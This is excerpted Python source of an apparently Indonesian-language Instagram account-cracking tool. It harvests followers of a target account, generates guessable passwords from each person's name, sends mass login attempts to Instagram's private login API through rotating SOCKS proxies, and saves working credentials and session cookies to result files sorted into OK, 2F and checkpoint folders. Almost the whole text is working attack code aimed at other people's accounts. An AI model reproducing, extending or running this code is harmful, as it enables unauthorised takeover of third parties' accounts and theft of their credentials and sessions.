...
class Instagram:
    ...
    def Menu_Instagram(self, created, exspired, sisa, cookie):
        ...
        if query == '01' or query == '1':
            try:
                Console(width=65, style=f"{style_terminal}").print(Panel(
                    "[grey50]Silahkan Masukan '[green]Username[grey50]' Akun Instagram Target...",
                    title="[white]• [green]Catatan [white]•"))
        
                username = Console().input("[grey50]   ╰─> ")
                success_count = 0
        
                for raw_username in username.split(','):
                    self.username = raw_username.strip()
                    ...
                    try:
                        ...
                        if uid:
                            self.Dump_Followers(True, uid, cookie, '')
                            success_count += 1
                            Console().print(f"[green]Berhasil memproses: {self.username}")
                    except Exception as e:
                        Console().print(f"[red]Error saat proses {self.username}: {str(e)}")
                        continue
        
                if success_count == 0:
                    Console().print("[red]Tidak ada username yang berhasil diproses!")
                    exit()
            
                if len(dump) < 50:
                    Console(width=65, style=f"{style_terminal}").print(Panel(
                        "[grey50]Jumlah Dump Terlalu Sedikit (<50)",
                        title="[white]• [red]Error [white]•"))
                    exit()
                else:
                    self.Methode()
            ...
            try:
                ...
                if choose =='01' or choose =='1':
                    try: self.result_ok = os.listdir('/sdcard/OK')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    ...
                    try: self.result_two = os.listdir('/sdcard/2F')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
                    ...
                    try: self.result_cp = os.listdir('/sdcard/CP')
                    except (Exception) as e:
                        Console(width = 65, style = f"{style_terminal}").print(Panel(f"[grey50]{str(e).title()}", title = f"[white]• [red]Error Not Found [white]•"))
                        exit()
        ...
        elif query == '12':  # Menu baru
            try:
                Console(width=65, style=f"{style_terminal}").print(Panel(
                    "[grey50]Silahkan masukkan path/nama file yang berisi data username<=>fullname",
                    title="[white]• [green]Ambil Data dari File [white]•",
                    subtitle="╭─────", subtitle_align="left"))
                file_path = Console().input("[grey50]   ╰─> ")
        
                if os.path.exists(file_path):
                    self.Ambil_Data_Dari_File(file_path)
            
                    if len(dump) < 50:
                        Console(width=65, style=f"{style_terminal}").print(Panel(
                            f"[grey50]Jumlah data dari file hanya {len(dump)} (<50). Lanjutkan crack? (y/n)",
                            title="[white]• [yellow]Peringatan [white]•"))
                        lanjut = Console().input("[grey50]   ╰─> ")
                        if lanjut.lower() != 'y':
                            exit()
                    ...
                    Console(width=65, style=f"{style_terminal}").print(Panel(
                        f"[grey50]File '{file_path}' tidak ditemukan!",
                        title="[white]• [red]Error [white]•"))
                    exit()
    ...
    def Dump_Followers(self, type, username, cookie, cursor):
        with requests.Session() as r:
            try:
                end_after = ('variables={"id":"%s","first":5000,"after":"%s"}'%(username,cursor))
    ...
    def Ambil_Data_Dari_File(self, file_path):
        try:
            Console().print(f"[grey50]   ╰─> Membaca data dari file: [green]{file_path}")
            ...
            for line in lines:
                ...
                if line and '<=>' in line:
                    if line not in dump:
                        ...
                        Console().print(f"[grey50]   ╰─> Data: [green]@{str(username)[:20]}[grey50]/[blue]{len(dump)}", end='\r')
        
            Console().print(f"\n[green]✓[grey50] Berhasil membaca [blue]{len(dump)}[grey50] data dari file!")
    ...
    def Password(self, name, kombinasi):
        ...
        for nama in name.split(' '):
            if len(nama) < 3:
                ...
                elif kombinasi in ('03') or kombinasi in ('3'): komb = [f'{nama}321',f'{nama}',f'{nama}cantik',f'{nama}03',f'{nama}12',f'{nama}123',f'{nama}1234',f'{nama}12345']
    ...
    def Exec_Private_Api(self, username, password):
        ...
        for passwd in password:
            try:
                ...
                try:
                    proxy = {'http': 'socks4://'+str(random.choice(open("/sdcard/Zoraa-Dev/Penyimpanan/ProxyTS.txt","r").read().splitlines()))}
                ...
                if 'logged_in_user' in str(response):
                    ...
                    if 'ya' in self.amankan_akun:
                        try:
                            ...
                            printz(tree)
                            save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n{users}|{passwd}\n'
                        except Exception as e:
                            print(e)
                            tree = Tree('\r                                             ')
                            tree = tree.add('╭ [italic green]Response Success')
                        ...
                        printz(tree)
                        save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n{users}|{passwd}\n'
                    with open('/sdcard/OK/OK-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break          
                    ...
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n{users}|{passwd}\n'
                    self.faktor+=1
                    with open('/sdcard/2F/2F-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()   
                    break 
                    ...
                    save = f'{username}|{passwd}|{follower}|{followed}|{feedpost}|{cookie}\n{users}|{passwd}\n'
                    self.chekpoint+=1
                    with open('/sdcard/CP/CP-Instagram-'+self.save_result,'a') as wr:
                        wr.write(save)
                        wr.close()
                    break    
        ...
        for passwd in password:
            try:
                ...
                try:
                    ...
                    Console().print(f"[grey50]   ──>[red] {str(e).title()}", end='\r')
                    proxy = None  
                response = byps.post('https://b.i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', data = encode, proxies = proxy, allow_redirects=True).text
                self.save_result = self.Simpan_Result()
                if 'logged_in_user' in str(response.replace('\\','')):
